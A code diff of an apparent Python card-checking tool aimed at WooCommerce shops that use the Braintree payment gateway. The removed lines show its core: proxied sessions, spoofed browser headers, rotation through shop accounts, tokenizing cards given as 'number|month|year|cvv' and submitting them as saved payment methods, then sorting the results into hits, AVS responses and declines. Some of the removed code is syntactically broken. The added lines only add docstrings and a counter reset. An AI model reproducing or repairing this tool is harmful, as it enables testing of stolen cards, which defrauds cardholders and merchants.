@@ -194,151 +194,27 @@ class Stats:
         self.start = time.time()
 
     def bump(self, kind: str):
+        """Increment a counter and update the done counter."""
         with self.lock:
             setattr(self, kind, getattr(self, kind) + 1)
             self.done += 1
         update_status(self)
 
     def snapshot(self) -> Tuple[int, int, int, int, int, int]:
+        """Return current stats as a tuple."""
         with self.lock:
             return self.hits, self.avs, self.custom, self.fail, self.done, self.total
 
-
-STATS = Stats()
-
-
-def classify(message: str) -> Tuple[str, str]:
-    """Return ('hit'|'avs'|'custom'|'fail', LABEL)."""
-    low = message.lower()
-    if any(t in low for t in AVS_TRIGGERS) or re.search(r'\bavs\b', low):
-        return "avs", "AVS"
-    if "success" in low or "added" in low:
-        return "hit", "PASS"
-    if RISK_TRIGGER in low:
-        return "custom", "FAIL"
-    return "fail", "FAIL"
-
-
-def next_account(exclude=()):
-    """Return the next account in the rotation, skipping the excluded logins."""
-    global _ACC_IDX
-    n = len(ACCOUNTS)
-    if n == 0:
-        return None
-    with _ACC_LOCK:
-        for _ in range(n):
-            acc = ACCOUNTS[_ACC_IDX % n]
-            _ACC_IDX += 1
-            if acc["login"] not in exclude:
-                return dict(acc)
-        return dict(ACCOUNTS[_ACC_IDX % n])
-
-
-# ──────────────────────────────────────────────────────────────────────
-# HTTP HELPERS
-# ──────────────────────────────────────────────────────────────────────
-def make_session(proxied: bool = True) -> requests.Session:
-    s = requests.Session()
-    s.trust_env = False
-    if proxied:
-        s.proxies.update(PROXIES)
-    adapter = HTTPAdapter(
-        pool_connections=max(THREADS * 2, 20),
-        pool_maxsize=max(THREADS * 2, 20),
-        max_retries=0,
-    )
-    s.mount("https://", adapter)
-    s.mount("http://", adapter)
-    return s
-
-
-def request(session: requests.Session, method: str, url: str, retries: int = 2, **kwargs):
-    kwargs.setdefault("timeout", (CONNECT_TIMEOUT, READ_TIMEOUT))
-    last_exc = None
-    for i in range(retries + 1):
-        try:
-            r = session.request(method, url, **kwargs)
-            if r.status_code >= 500 and i < retries:
-                time.sleep(0.25 * (i + 1))
-                continue
-            return r
-        except Exception as e:
-            last_exc = e
-            if i < retries:
-                time.sleep(0.25 * (i + 1))
-    raise last_exc
-
-
-def build_headers(referer: Optional[str] = None,
-                  content_type: Optional[str] = None,
-                  extra: Optional[dict] = None,
-                  ajax: bool = False) -> dict:
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.5',
-        'user-agent': UA,
-        'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-gpc': '1',
-    }
-    if ajax:
-        headers.update({
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'x-requested-with': 'XMLHttpRequest',
-        })
-    if referer:
-        headers['referer'] = referer
-    if content_type:
-        headers['content-type'] = content_type
-    if extra:
-        headers.update(extra)
-    return headers
-
-
-# ──────────────────────────────────────────────────────────────────────
-# LIGHTWEIGHT HTML PARSING
-# ──────────────────────────────────────────────────────────────────────
-def find_nonce(html: str, name: str) -> Optional[str]:
-    pat = re.escape(name)
-    m = re.search(rf'name=["\']{pat}["\'][^>]*?value=["\']([^"\']+)', html)
-    if not m:
-        m = re.search(rf'value=["\']([^"\']+)["\'][^>]*?name=["\']{pat}["\']', html)
-    return m.group(1) if m else None
-
-
-def strip_tags(s: str) -> str:
-    return re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', s)).strip()
-
-
-def extract_errors(html: str) -> List[str]:
-    out = []
-    for block in re.findall(r'<ul[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</ul>', html, re.S | re.I):
-        out.extend(strip_tags(li) for li in re.findall(r'<li[^>]*>(.*?)</li>', block, re.S | re.I))
-    return [e for e in out if e]
-
-
-def extract_success(html: str) -> Optional[str]:
-    m = re.search(r'<div[^>]*class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', html, re.S | re.I)
-    return strip_tags(m.group(1)) if m else None
-
-
-def is_logged_in(html: str) -> bool:
-    return ("Log out" in html) or ("Dashboard" in html) or ("woocommerce-MyAccount-navigation" in html)
-
-
-def parse_card(card: str) -> Optional[Tuple[str, str, str, str]]:
-    parts = card.split("|")
-    if len(parts) == 3:
-        return parts[0], parts[1], parts[2], ""
-    if len(parts) == 4:
-        return parts[0], parts[1], parts[2], parts[3]
-    return None
-
+    def reset(self):
+        """Reset all counters to zero."""
+        with self.lock:
+            self.hits = 0
+            self.avs = 0
+            self.custom = 0
+            self.fail = 0
+            self.done = 0
+            self.total = 0
+            self.start = time.time()
 
 # ──────────────────────────────────────────────────────────────────────
 # WORKER CLASS (Core Checking Logic)
@@ -475,49 +351,6 @@ mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
         data = r.json()
         if "errors" in data:
             raise Exception(f"Braintree errors: {data['errors']}")
-        return data["data"]["tokenizeCreditCard"]["token"]
-
-    # -- submit -------------------------------------------------------------
-    def submit_card(self, card):
-        parsed = parse_card(card)
-        if not parsed:
-            return "Invalid card format"
-        token = self.tokenize(*parsed)
-
-        submit_headers = build_headers(
-            referer=ADD_PAYMENT_URL,
-            content_type="application/x-www-form-urlencoded",
-            extra={
-                "cache-control": "max-age=0",
-                "origin": BASE_URL,
-                "priority": "u=0, i",
-                "sec-fetch-user": "?1",
-                "upgrade-insecure-requests": "1",
-            },
-        )
-        data = [
-            ("payment_method", "braintree_credit_card"),
-            ("wc-braintree-credit-card-card-type", "visa"),
-            ("wc-braintree-credit-card-3d-secure-enabled", ""),
-            ("wc-braintree-credit-card-3d-secure-verified", ""),
-            ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
-            ("wc_braintree_credit_card_payment_nonce", token),
-            ("wc_braintree_device_data", json.dumps({"correlation_id": str(uuid.uuid4())})),
-            ("wc-braintree-credit-card-tokenize-payment-method", "true"),
-            ("wc_braintree_paypal_payment_nonce", ""),
-            ("wc_braintree_paypal_context", "shortcode"),
-
-        r = request(self.session, "POST", ADD_PAYMENT_URL, headers=submit_headers, data=data)
-
-    errors = extract_errors(r.text)
-    if errors:
-        return "; ".join(errors)
-    msg = extract_success(r.text)
-    if msg:
-        return msg
-    m = re.search(r"(?i)(declined|error|invalid|failed|problem|risk|avs|cvv|so soon)[^<]{0,200}", r.text)
-    return m.group(0).strip() if m else "Unknown decline"
-
 
 # ──────────────────────────────────────────────────────────────────────
 # MAIN ENTRY POINT
